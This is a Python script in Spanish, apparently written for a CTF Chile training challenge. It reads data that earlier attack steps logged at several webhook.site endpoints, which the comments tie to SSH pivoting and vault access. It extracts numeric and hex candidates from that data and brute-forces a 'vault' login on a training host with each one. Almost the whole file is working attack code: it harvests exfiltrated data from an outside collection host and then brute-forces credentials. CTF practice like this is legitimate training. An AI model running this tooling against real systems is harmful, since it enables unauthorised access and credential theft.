#!/usr/bin/env python3
"""
CTF Chile - Escáner de todos los webhooks anteriores
Buscar la clave digital en data previa
"""
import requests
import re

# Todos los webhooks que hemos generado
webhooks = [
    "f7672de0-0175-4e65-b60f-14b482dd717c",  # SSH pivot
    "4b46c013-f5ae-491f-b999-e83989fc4aa9",  # Alternative pivot
    "d23e1113-6d61-4f18-abd0-1e7e98948c8d",  # CTF solver
    "e67704d3-8aab-44f2-9b7e-01393ca50441",  # Vault SSH access
    "74a3a404-ee36-4b83-b1ab-425f472ac343",  # Decode vault data
]

TARGET = "http://training-pod2.ctfchile.com:32778"

def test_digital_key(key):
    """Prueba una clave digital"""
    try:
        r = requests.post(TARGET + "/api/login",
                         headers={"Content-Type": "application/json"},
                         json={"username": "vault", "claveDigital": str(key)},
                         timeout=5)

        if "incorrecta" not in r.text and r.status_code != 401:
            print(f"🏆 CLAVE DIGITAL ENCONTRADA: {key}")
            print(f"    Respuesta: {r.text}")
            return True

    except:
        pass

    return False

print("🔍 ESCANEANDO TODOS LOS WEBHOOKS ANTERIORES")
print("=" * 50)

potential_keys = set()

for webhook_uuid in webhooks:
    print(f"\n📡 Analizando webhook: {webhook_uuid}")

    try:
        r = requests.get(f"https://webhook.site/token/{webhook_uuid}/requests?per_page=100", timeout=10)
        if r.status_code == 200:
            data = r.json().get("data", [])
            print(f"    {len(data)} requests encontrados")

            for req in data:
                content = req.get("content", "") + " " + req.get("text_content", "")

                if content:
                    # Buscar números que podrían ser claves digitales
                    numbers = re.findall(r'\b\d{4,12}\b', content)
                    for num in numbers:
                        potential_keys.add(num)

                    # Buscar hashes hex
                    hex_patterns = re.findall(r'\b[a-fA-F0-9]{8,16}\b', content)
                    for hex_val in hex_patterns:
                        potential_keys.add(hex_val)

                    # Buscar strings específicos
                    if "clave" in content.lower() or "key" in content.lower() or "digital" in content.lower():
                        print(f"    💡 Pista encontrada: {content[:200]}...")

                    # Buscar líneas que contengan números importantes
                    lines = content.split('\n')
                    for line in lines:
                        if re.search(r'\d{6,}', line):
                            potential_keys.add(re.findall(r'\d{6,}', line)[0] if re.findall(r'\d{6,}', line) else "")

        else:
            print(f"    ❌ No accesible (status {r.status_code})")

    except Exception as e:
        print(f"    ❌ Error: {e}")

print(f"\n🔑 CLAVES POTENCIALES ENCONTRADAS: {len(potential_keys)}")

# Probar todas las claves encontradas
successful_keys = []

for key in potential_keys:
    if key and len(key) >= 4:  # Solo claves de al menos 4 caracteres
        if test_digital_key(key):
            successful_keys.append(key)

if not successful_keys:
    print("\n❌ No se encontró la clave digital en webhooks anteriores")
    print("\n🔍 CLAVES PROBADAS:")
    for key in sorted(potential_keys):
        if key and len(key) >= 4:
            print(f"    • {key}")

    print("\n💡 BUSCAR MANUALMENTE EN WEBHOOKS:")
    for webhook in webhooks:
        print(f"    • https://webhook.site/#!/{webhook}")

else:
    print(f"\n🏆 ÉXITO! Claves digitales válidas: {successful_keys}")

print("\n" + "="*60)
print("🔍 ESCANEO COMPLETADO")
print("="*60)